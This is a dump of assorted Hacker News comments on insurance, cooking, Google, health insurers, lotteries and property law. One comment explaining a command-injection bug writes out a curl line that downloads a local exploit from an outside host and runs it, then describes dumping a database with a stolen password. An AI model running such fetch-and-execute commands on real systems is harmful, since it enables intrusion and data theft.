8367503,comment,8366749,8367321,2,0,cpwright,,,"However, with many forms of insurance the expected value is very nearly 1.  Term life, for example, pays out 90%+ of premiums as death benefits.  You are unlikely to get any of that money, as most policies do not pay out; but the low probability of a payout multiplied by a comparably high death benefit results in E(X) not to far from 1.<p>Another reason we keep paying for insurance even with bad expected values (e.g., title insurance) is because we have no choice about the matter.  If I want a mortgage, I need title insurance, even though only a small fraction of the premiums are actually paid out as claims.",1411657145

More than likely, even those with all those skills and at the 1% of them can&#x27;t just eyeball code and go, &quot;Ah yes, here.&quot; They&#x27;re instead writing a lot of little tools and seeing what they can break. Then they go back, see what broke, and work out if its possible to exploit that exception or crash condition.<p>These types of tools and methods work just as well with closed source. Attacking closed source seems very unfair to me in these scenarios.",1411657090

8367491,comment,8356489,8356489,1,0,seanrrwilkins,,,"1. Why do you cook? Is it to save cash or is it recreation? Or something else?<p>I cook as another creative outlet, as a way to relax and a way to put a break between work and personal time. It&#x27;s a nice ritual to come home and cook a quick dinner, or take the time to make a big meal on a weekend and try something new.<p>Cooking for myself is also much cheaper most of the time, especially this time of year when we get so many great vegetables in season.<p>2. Do you plan ahead? Like a weekly meal plan?<p>I tried to do a weekly plan, but it just didn&#x27;t work for me. I like to buy groceries for 2 days at a time, at most, and I enjoy the trip to the store to see what&#x27;s looking good and inspires me.<p>The only real planning I do is to keep a well organized list of posts and recipes in Evernote that I want to try at some point.<p>3. What kind of things do you cook usually?<p>This summer I&#x27;ve been cooking a TON of fish and fresh corn succotash(like a cooked corn salsa). In the cooler months I love making a universal broth for ramen, braising greens ,etc and have it on hand for a couple days. And lots of simple roasts with a primary protein like chicken or pork and a ton of vegetables.<p>Food52 and Saveur are my go-tos for great recipes and a little inspiration. If you&#x27;re looking for something simple and jsut starting out, I recommend sidechef.com for great beginner recipes and tips from start to finish.<p>4. Do you follow any diet? Atkins, Slow Carb etc.<p>I like the slow carb foods and naturally gravitate towards that without having to follow a real plan. Beans, lentils, proteins and a ton of vegetables are always staples on my plate at home.<p>5. Do you have any life hacks, tips to be more productive as a cook?<p>Just like exercise, reading, social time, it&#x27;s all about how you prioritize. Cooking can be a quick 10 minutes to make a simple frittata, or several hours for something more elaborate on a weekend.<p>Personally, if I&#x27;m working from home, I schedule a break to start cooking dinner in the afternoon. And I usually cook enough to have leftovers to play with for another day or two. It saves time and money to make larger batches.<p>Other hacks are focusing on one-pot dishes and the slow cooker in the winter. I love putting a bunch of stuff in the slow cooker in the AM and coming home to a done meal at the end of the day with no additional work needed.",1411656976

Martin Odersky&#x27;s concerns about the upcoming Java REPL). In Java/CXX it&#x27;s much more likely for a function to want to change an external object, in which case you&#x27;ll need to set up the environment, run the code, check the environment for the change, for every line you write.

Bio from his webpage:<p><i>Michaels career, not only as an artist, is a rather unusual one: born in 1969 in Vienna, he got interested in technology, especially electronics and mathematics, already when 7 years old.  At the age of 12 he worked as a programmer. He quit school at 17 and started his first own business in the financial field, publishing analysis on the financial markets and managing funds, until he sold his business at the age of 23. The following 3 years he spent climbing and hiking in Africa, USA, Asia, and all over Europe. From 1995 on he was the publisher of werk-zeug, a technology and art magazine, as well as streetfashion, a magazine featuring fashionable people on the streets all over the world. He was also active in the field of software development, is the originator of many inventions, and holds international patents ranging from climbing equipment and bicycle gears to trading systems and electronic payment systems. Already in 2001, Michael decided to sell his companies to start his career in arts and works as he calls it. In the very same year though, he started a side business on eBay that eventually became the world&#x27;s largest powerselling enterprise on eBay, a company with 80 employees and a turnover of 30 million euros a year. In early 2005, the company went bankrupt, and Michael lost all his money in the process. Never shying away from new challenges, he decided to write a book about the company and its end: English and German versions of &quot;The end of EBay&quot;  are available through Amazon here. Qentis&#x27; bankruptcy also had its good sides: finally, Michael could concentrate on his art and private studies. Michael’s works are the result of a rich live and a long history of ideas. The artist about his work: &quot;there is no way to (mate)realize all the plans and projects I have on my mind in one lifetime- I can only pick the best and feasible&quot;. His work touches a broad variety of fields such as technology, politics, science, social topics, and style.</i>",1411656502

You&#x27;re just a problem customer in their portfolio.&quot;</i><p>Right, with two caveats.  A big problem with relying on competition to get good behaviour out of health insurers is that for health care in particular the common pattern is that expenses are low, and then for some expenses get high and stay high.  As you say, this means that as soon as you need to actually <i>use</i> your insurance, you&#x27;re a &quot;problem customer&quot; and - basic incentives wise - they&#x27;d rather not have you as a customer any more.  If they frustrate you sufficiently that you say, &quot;Screw this, I&#x27;m going to your competitor!&quot; they win - they keep all the money you paid in, and it&#x27;s their competitor that needs to pay out now.<p>The caveats.<p>First: employer based health care, as weird as it is, serves a role as collective bargaining.  Losing the sick person is good.  Losing the sick person and a couple thousand healthy people is bad (or at least less good).<p>The other caveat is the cap on the medical loss ratio in the ACA.  If a company is operating near the cap (and why wouldn&#x27;t they be?) then the pool of money available for executives and shareholders can depend more on total revenues than on revenues minus medical costs.  When that&#x27;s true, losing any customer hurts - even one that nets negative.<p>I don&#x27;t think either of these is doing enough (the second might, long term, but I&#x27;m not sure the industry has internalized it yet), but they help some.",1411656193

The most obvious example is Google+, however YouTube is also a prime example (the change to video search is fairly recent), as is Google Maps (which effectively wiped out the sometimes superior competition at the time), and Gmail (which was heavily advertised on Google.com).<p>While Google doesn&#x27;t, as far as I know, &quot;fix&quot; search rankings to give themselves an edge they do sprinkle adverts for their products before search results (e.g. YouTube, Google Maps) or around the perimeter of the page (e.g. Google+, Gmail).<p>That all being said however: I&#x27;d take what Google does over what News Corp does any day of the week.

There are a lot of local exploits for most operating systems. So once I can execute some arbitrary commands, I can simply:<p><pre><code>   curl http://www.exploits.org/local_exploit1 -o iwin; ./iwin\n</code></pre>\n(or more sophisticated variants that ensure the code is executable).<p>Even if you assume an otherwise perfect OS, this is dangerous, because e.g. www-data can usually access more code and data than any given web app user could. So now I could (e.g.) start dumping the database, which I accessed because I found the password in a PHP file www-data has to be able to read.<p>Keep in mind that a lot of information is passed around with environment variables - it&#x27;s what they are for (keeps the need for complex command line parsing - a source of bugs itself -  down). So while everyone is tying the exploit to web servers, that is because it is a trivial example of a place input data can be turned into an environment variable.

Granted, they also assume that most people are risk-averse as opposed to risk-loving, i.e. most would not risk 1 for a 50% chance of winning 2.0001. On the other hand, the economics of the lottery are such that the amount you pay (even if you play every day for your whole life) is quite negligible compared to all the money you will earn during your life; if you win, you will practically maximize the utility of a few very important things in life (earning more, and working less).

But he didn&#x27;t buy the property until 2008, so, insofar as any public taking occurred with the public acccess provisions, they occurred prior to his taking ownership and were priced into the sale when the prior owner sold the property to Khosla. So, there&#x27;s no reason even if the coastal laws <i>were</i> a regulatory taking, that Khosla would be entitled to any compensation.

It&#x27;s necessary, but not sufficient.  But the converse is not necessary.  It is not necessary that I be able to <i>allow</i> anyone to drive my car in order to say that I own it.  I can&#x27;t, for example, allow an unlicensed driver to drive my car, but that doesn&#x27;t mean I don&#x27;t own my car.<p>> you instead countered with &quot;ownership of a gun equals the right to restrict how it can be used.&quot;<p>No, you got this backwards.
